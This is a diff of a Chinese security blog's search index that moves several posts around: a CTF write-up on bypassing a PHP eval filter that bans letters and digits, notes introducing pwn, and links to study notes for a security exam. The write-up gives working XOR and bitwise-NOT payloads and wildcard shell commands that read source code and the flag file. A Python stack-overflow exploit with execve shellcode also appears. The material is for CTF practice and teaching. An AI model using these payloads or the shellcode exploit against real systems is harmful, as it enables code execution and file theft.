@@ -520,45 +520,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CTF一道web题小结-无数字字母getFlag()</title>
-    <url>/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/</url>
-    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近遇到个CTF题目，分析后涨了波知识，题目如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><a id="more"></a><br>分析代码，了解到我们需要满足两个条件：</p>
-<ol>
-<li>长度不能大于35</li>
-<li>不能存在数字字母_和$符号</li>
-</ol>
-<h2 id="0x02-无数字字母构造payload"><a href="#0x02-无数字字母构造payload" class="headerlink" title="0x02 无数字字母构造payload"></a>0x02 无数字字母构造payload</h2><p>首先，看到不能存在字母数字就想到了phithon师傅的文章里关于无字母数字webshell提到的3种方法提供了两种思路：</p>
-<ol>
-<li>利用位运算</li>
-<li>利用自增运算符<br>想到payload应该是code=getFlag(),于是开始构造getFlag()。<br>在网上找到一个payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_();</span><br></pre></td></tr></table></figure>
-分析：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">采用异或运算</span><br><span class="line">&#123; ^ %1c &#x3D; g</span><br><span class="line">&#123; ^ %1e &#x3D; e</span><br><span class="line">&#123; ^ %0f &#x3D; t</span><br><span class="line">&#123; ^ %3d &#x3D; F</span><br><span class="line">&#123; ^ %17 &#x3D; l</span><br><span class="line">&#123; ^ %1a &#x3D; a</span><br><span class="line">所以&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot; &#x3D; getFlag</span><br><span class="line">$_&#x3D;getFlag将_赋值为getFlag，最终得到getFlag()。</span><br></pre></td></tr></table></figure>
-还有个payload为<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_();</span><br></pre></td></tr></table></figure>
-直接取反getFlag再url编码。<br>其中_可以使用汉字代替，如<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$啊&#x3D;~%98%9A%8B%B9%93%9E%98;$啊();</span><br></pre></td></tr></table></figure>
-当不过滤<strong>$</strong>符号时,可以这样操作，但是<strong>$</strong>符号过滤了，参考p牛的《无字母数字webshell之提高篇》中讲到PHP7是允许使用($a)()来执行动态函数;<br>此时，测试使用phpinfo();payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
-使用php5进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php5测试phpinfo.PNG" alt></li>
-</ol>
-<p>获取phpinfo信息失败。</p>
-<p>使用php7进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php7测试phpinfo.PNG" alt></p>
-<p>获取phpinfo信息成功。</p>
-<h2 id="0x03-解题思路"><a href="#0x03-解题思路" class="headerlink" title="0x03 解题思路"></a>0x03 解题思路</h2><p>利用通配符调用Linux系统命令 来查看flag。<br>在Linux系统中可以使用? * 等字符来正则匹配字母：</p>
-<ul>
-<li>*可以代替0个及以上任意字符</li>
-<li>?可以代表1个任意字符</li>
-</ul>
-<p>可以使用?来代替字符：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;??? &#x3D;&gt; &#x2F;bin&#x2F;cat</span><br></pre></td></tr></table></figure><br>用此来读取源码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;?????.???&#96;;?&gt;&lt;?&#x3D;$_?&gt;</span><br><span class="line">&quot;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;</span><br></pre></td></tr></table></figure><br>为保持长度小于35且不存在$_,则将$_带入后面一个表达式，同时使用*来匹配最后文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;*&#96;?&gt;</span><br></pre></td></tr></table></figure><br>php使用短链接，其含义如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &#96;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#96;?&gt;</span><br></pre></td></tr></table></figure><br>读取到源码发现存在如下函数：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">	$flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>最后直接读取flag文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;????&#96;;?&gt;</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x04-其它思考"><a href="#0x04-其它思考" class="headerlink" title="0x04 其它思考"></a>0x04 其它思考</h2><p>windows中将if(preg_match(“/[A-Za-z0-9_$]+/“,$code))过滤修改，去除对大写字母或小写的过滤，由于windows对大小写不敏感，可以在windows系统中尝试执行任意代码<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows执行任意代码.PNG" alt></p>
-<p>不对if(preg_match(“/[A-Za-z0-9_$]+/“,$code))进行修改，将whoami进行取反再url编码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~%88%97%90%9E%92%96</span><br></pre></td></tr></table></figure><br>则失败。<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows绕过失败.PNG" alt></p>
-<p>去除[A-Za-z0-9_$]同样也无法执行代码，可见在windows中对命令进行位运算后会执行失败。</p>
-<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/2597#toc-8">[红日安全]PHP-Audit-Labs题解之Day5-8</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a><br><a href="https://www.anquanke.com/post/id/154284">CTF题目思考—极限利用</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>汇编指令</title>
     <url>/2018/09/05/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/</url>
     <content><![CDATA[<h2 id="数据定义"><a href="#数据定义" class="headerlink" title="数据定义"></a>数据定义</h2><p>db定义字节类型变量，一个字节数据占1个字节（8位）单元，读完一个，偏移量加1<br>dw定义字类型变量，一个字数据占2个字节（16位）单元，读完一个，偏移量加2<br>dd定义双字类型变量，一个双字数据占4个字节（32位）单元，读完一个，偏移量加4<br>dup操作符用来进行数据的重复：<br>db 重复的次数 dup (重复的字节型数据)。<br>dw 重复的次数 dup (重复的字型数据)。<br>dd 重复的次数 dup (重复的双字数据)。<br><a id="more"></a></p>
@@ -648,36 +609,42 @@
       </tags>
   </entry>
   <entry>
-    <title>PWN学习笔记1--入门</title>
-    <url>/2018/12/12/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<h1 id="0x00-pwn介绍"><a href="#0x00-pwn介绍" class="headerlink" title="0x00 pwn介绍"></a>0x00 pwn介绍</h1><p>  PWN是指二进制漏洞的发掘和利用，CTF中PWN题目一般出现在linux平台上<br><a id="more"></a></p>
-<h1 id="0x01-pwn所需的基础知识"><a href="#0x01-pwn所需的基础知识" class="headerlink" title="0x01 pwn所需的基础知识"></a>0x01 pwn所需的基础知识</h1><ul>
-<li>c语言</li>
-<li>汇编语言</li>
-<li>Python</li>
-<li>操作系统基础</li>
-<li>linux基本命令</li>
-</ul>
-<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>IP/EIP/RIP：指向当前的命令地址<br>SP/ESP/RSP：指向栈的顶部<br>BP/EBP/RBP：指向栈的底部</p>
-<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>一种后进先出的数据结构，用于调用函数过程中回复寄存器的状态。<br><img src="/2018/12/12/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%85%A5%E9%97%A8/栈.PNG" alt></p>
-<h2 id="大端与小端模式"><a href="#大端与小端模式" class="headerlink" title="大端与小端模式"></a>大端与小端模式</h2><p>以0x12345678为例（从左到右代表地址从低到高）</p>
+    <title>CTF一道web题小结-无数字字母getFlag()</title>
+    <url>/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近遇到个CTF题目，分析后涨了波知识，题目如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><a id="more"></a><br>分析代码，了解到我们需要满足两个条件：</p>
+<ol>
+<li>长度不能大于35</li>
+<li>不能存在数字字母_和$符号</li>
+</ol>
+<h2 id="0x02-无数字字母构造payload"><a href="#0x02-无数字字母构造payload" class="headerlink" title="0x02 无数字字母构造payload"></a>0x02 无数字字母构造payload</h2><p>首先，看到不能存在字母数字就想到了phithon师傅的文章里关于无字母数字webshell提到的3种方法提供了两种思路：</p>
+<ol>
+<li>利用位运算</li>
+<li>利用自增运算符<br>想到payload应该是code=getFlag(),于是开始构造getFlag()。<br>在网上找到一个payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_();</span><br></pre></td></tr></table></figure>
+分析：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">采用异或运算</span><br><span class="line">&#123; ^ %1c &#x3D; g</span><br><span class="line">&#123; ^ %1e &#x3D; e</span><br><span class="line">&#123; ^ %0f &#x3D; t</span><br><span class="line">&#123; ^ %3d &#x3D; F</span><br><span class="line">&#123; ^ %17 &#x3D; l</span><br><span class="line">&#123; ^ %1a &#x3D; a</span><br><span class="line">所以&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot; &#x3D; getFlag</span><br><span class="line">$_&#x3D;getFlag将_赋值为getFlag，最终得到getFlag()。</span><br></pre></td></tr></table></figure>
+还有个payload为<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_();</span><br></pre></td></tr></table></figure>
+直接取反getFlag再url编码。<br>其中_可以使用汉字代替，如<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$啊&#x3D;~%98%9A%8B%B9%93%9E%98;$啊();</span><br></pre></td></tr></table></figure>
+当不过滤<strong>$</strong>符号时,可以这样操作，但是<strong>$</strong>符号过滤了，参考p牛的《无字母数字webshell之提高篇》中讲到PHP7是允许使用($a)()来执行动态函数;<br>此时，测试使用phpinfo();payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
+使用php5进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php5测试phpinfo.PNG" alt></li>
+</ol>
+<p>获取phpinfo信息失败。</p>
+<p>使用php7进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php7测试phpinfo.PNG" alt></p>
+<p>获取phpinfo信息成功。</p>
+<h2 id="0x03-解题思路"><a href="#0x03-解题思路" class="headerlink" title="0x03 解题思路"></a>0x03 解题思路</h2><p>利用通配符调用Linux系统命令 来查看flag。<br>在Linux系统中可以使用? * 等字符来正则匹配字母：</p>
 <ul>
-<li>小端 \x78\x56\x34\x12</li>
-<li>大端 \x12\x34\x56\x78</li>
+<li>*可以代替0个及以上任意字符</li>
+<li>?可以代表1个任意字符</li>
 </ul>
-<p>大端模式：PowerPC、IBM、Sun、大部分网络协议<br>小端模式：X86、DEC</p>
-<h1 id="0x02-栈溢出"><a href="#0x02-栈溢出" class="headerlink" title="0x02 栈溢出"></a>0x02 栈溢出</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞。<br>发生栈溢出的基本前提是：</p>
-<ul>
-<li>程序必须向栈上写入数据</li>
-<li>写入的数据大小没有被良好地控制</li>
-</ul>
-<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://zhuanlan.zhihu.com/p/34665623">从零开始学CTF</a></p>
+<p>可以使用?来代替字符：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;??? &#x3D;&gt; &#x2F;bin&#x2F;cat</span><br></pre></td></tr></table></figure><br>用此来读取源码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;?????.???&#96;;?&gt;&lt;?&#x3D;$_?&gt;</span><br><span class="line">&quot;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;</span><br></pre></td></tr></table></figure><br>为保持长度小于35且不存在$_,则将$_带入后面一个表达式，同时使用*来匹配最后文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;*&#96;?&gt;</span><br></pre></td></tr></table></figure><br>php使用短链接，其含义如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &#96;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#96;?&gt;</span><br></pre></td></tr></table></figure><br>读取到源码发现存在如下函数：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">	$flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>最后直接读取flag文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;????&#96;;?&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x04-其它思考"><a href="#0x04-其它思考" class="headerlink" title="0x04 其它思考"></a>0x04 其它思考</h2><p>windows中将if(preg_match(“/[A-Za-z0-9_$]+/“,$code))过滤修改，去除对大写字母或小写的过滤，由于windows对大小写不敏感，可以在windows系统中尝试执行任意代码<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows执行任意代码.PNG" alt></p>
+<p>不对if(preg_match(“/[A-Za-z0-9_$]+/“,$code))进行修改，将whoami进行取反再url编码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~%88%97%90%9E%92%96</span><br></pre></td></tr></table></figure><br>则失败。<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows绕过失败.PNG" alt></p>
+<p>去除[A-Za-z0-9_$]同样也无法执行代码，可见在windows中对命令进行位运算后会执行失败。</p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/2597#toc-8">[红日安全]PHP-Audit-Labs题解之Day5-8</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a><br><a href="https://www.anquanke.com/post/id/154284">CTF题目思考—极限利用</a></p>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>pwn</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -702,6 +669,39 @@
 </ul>
 <h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exp.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</span><br><span class="line"></span><br><span class="line"><span class="comment">#Stack address where shellcode is copied.</span></span><br><span class="line">ret_addr = <span class="number">0xbffff1d0</span>       </span><br><span class="line"></span><br><span class="line"><span class="comment">#Spawn a shell</span></span><br><span class="line"><span class="comment">#execve(/bin/sh)</span></span><br><span class="line">scode = <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#endianess convertion</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span>(<span class="params">num</span>):</span></span><br><span class="line"> <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;I&quot;</span>,num</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf = Junk + RA + NOP&#x27;s + Shellcode</span></span><br><span class="line">buf = <span class="string">&quot;A&quot;</span> * <span class="number">268</span></span><br><span class="line">buf += conv(ret_addr)</span><br><span class="line">buf += <span class="string">&quot;\x90&quot;</span> * <span class="number">100</span></span><br><span class="line">buf += scode</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Calling vulnerable program&quot;</span></span><br><span class="line">call([<span class="string">&quot;./vuln&quot;</span>, buf])</span><br></pre></td></tr></table></figure>
 <h1 id="英文原文"><a href="#英文原文" class="headerlink" title="英文原文"></a>英文原文</h1><p><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/">Classic Stack Based Buffer Overflow</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PWN学习笔记1--入门</title>
+    <url>/2018/12/12/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<h1 id="0x00-pwn介绍"><a href="#0x00-pwn介绍" class="headerlink" title="0x00 pwn介绍"></a>0x00 pwn介绍</h1><p>  PWN是指二进制漏洞的发掘和利用，CTF中PWN题目一般出现在linux平台上<br><a id="more"></a></p>
+<h1 id="0x01-pwn所需的基础知识"><a href="#0x01-pwn所需的基础知识" class="headerlink" title="0x01 pwn所需的基础知识"></a>0x01 pwn所需的基础知识</h1><ul>
+<li>c语言</li>
+<li>汇编语言</li>
+<li>Python</li>
+<li>操作系统基础</li>
+<li>linux基本命令</li>
+</ul>
+<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>IP/EIP/RIP：指向当前的命令地址<br>SP/ESP/RSP：指向栈的顶部<br>BP/EBP/RBP：指向栈的底部</p>
+<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>一种后进先出的数据结构，用于调用函数过程中回复寄存器的状态。<br><img src="/2018/12/12/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%85%A5%E9%97%A8/栈.PNG" alt></p>
+<h2 id="大端与小端模式"><a href="#大端与小端模式" class="headerlink" title="大端与小端模式"></a>大端与小端模式</h2><p>以0x12345678为例（从左到右代表地址从低到高）</p>
+<ul>
+<li>小端 \x78\x56\x34\x12</li>
+<li>大端 \x12\x34\x56\x78</li>
+</ul>
+<p>大端模式：PowerPC、IBM、Sun、大部分网络协议<br>小端模式：X86、DEC</p>
+<h1 id="0x02-栈溢出"><a href="#0x02-栈溢出" class="headerlink" title="0x02 栈溢出"></a>0x02 栈溢出</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞。<br>发生栈溢出的基本前提是：</p>
+<ul>
+<li>程序必须向栈上写入数据</li>
+<li>写入的数据大小没有被良好地控制</li>
+</ul>
+<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://zhuanlan.zhihu.com/p/34665623">从零开始学CTF</a></p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -901,30 +901,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2020年软考--信息安全工程师学习笔记</title>
-    <url>/2020/09/09/2020%E5%B9%B4%E8%BD%AF%E8%80%83-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p>2020年准备报考信息安全工程师，8月底出了《信息安全工程师教程（第2版）》，原来8大章节变成了26章（？？？），考试出题也以新版教程和大纲出题。</p>
-<p><img src="/2020/09/09/2020%E5%B9%B4%E8%BD%AF%E8%80%83-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/黑人问号.jpeg" alt></p>
-<a id="more"></a>
-<p><strong>不定期更新</strong></p>
-<p><a href="https://fl4g.cn/2020/09/09/第1章-网络信息安全概述/">第1章 网络信息安全概述</a></p>
-<p><a href="https://fl4g.cn/2020/09/10/第2章-网络攻击原理与常用方法/">第2章 网络攻击原理与常用方法</a></p>
-<p><a href="https://fl4g.cn/2020/09/14/第3章-密码学基本理论/">第3章 密码学基本理论</a></p>
-<p><a href="https://fl4g.cn/2020/09/16/第4章-网络安全体系与网络安全模型/">第4章 网络安全体系与网络安全模型</a></p>
-<p><a href="https://fl4g.cn/2020/09/17/第5章-物理环境安全技术/">第5章 物理环境安全技术</a></p>
-<p><a href="https://fl4g.cn/2020/09/18/第7章-访问控制技术原理与应用/">第7章 访问控制技术原理与应用</a></p>
-<p><a href="https://fl4g.cn/2020/09/18/第8章-防火墙技术原理与应用/">第8章 防火墙技术原理与应用</a></p>
-<p>推荐看信管网最新解读视频：</p>
-<p><a href="https://www.cnitpm.com/shipin/play.aspx?id=218">信息安全工程师教程（第2版）解读视频</a></p>
-]]></content>
-      <categories>
-        <category>信息安全工程师软考</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PWN中伪随机数问题--srand()/rand()</title>
     <url>/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/</url>
     <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。</p>
@@ -955,6 +931,142 @@
       </categories>
       <tags>
         <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020年软考--信息安全工程师学习笔记</title>
+    <url>/2020/09/09/2020%E5%B9%B4%E8%BD%AF%E8%80%83-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>2020年准备报考信息安全工程师，8月底出了《信息安全工程师教程（第2版）》，原来8大章节变成了26章（？？？），考试出题也以新版教程和大纲出题。</p>
+<p><img src="/2020/09/09/2020%E5%B9%B4%E8%BD%AF%E8%80%83-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/黑人问号.jpeg" alt></p>
+<a id="more"></a>
+<p><strong>不定期更新</strong></p>
+<p><a href="https://fl4g.cn/2020/09/09/第1章-网络信息安全概述/">第1章 网络信息安全概述</a></p>
+<p><a href="https://fl4g.cn/2020/09/10/第2章-网络攻击原理与常用方法/">第2章 网络攻击原理与常用方法</a></p>
+<p><a href="https://fl4g.cn/2020/09/14/第3章-密码学基本理论/">第3章 密码学基本理论</a></p>
+<p><a href="https://fl4g.cn/2020/09/16/第4章-网络安全体系与网络安全模型/">第4章 网络安全体系与网络安全模型</a></p>
+<p><a href="https://fl4g.cn/2020/09/17/第5章-物理环境安全技术/">第5章 物理环境安全技术</a></p>
+<p><a href="https://fl4g.cn/2020/09/18/第7章-访问控制技术原理与应用/">第7章 访问控制技术原理与应用</a></p>
+<p><a href="https://fl4g.cn/2020/09/18/第8章-防火墙技术原理与应用/">第8章 防火墙技术原理与应用</a></p>
+<p>推荐看信管网最新解读视频：</p>
+<p><a href="https://www.cnitpm.com/shipin/play.aspx?id=218">信息安全工程师教程（第2版）解读视频</a></p>
+]]></content>
+      <categories>
+        <category>信息安全工程师软考</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第2章 网络攻击原理与常用方法</title>
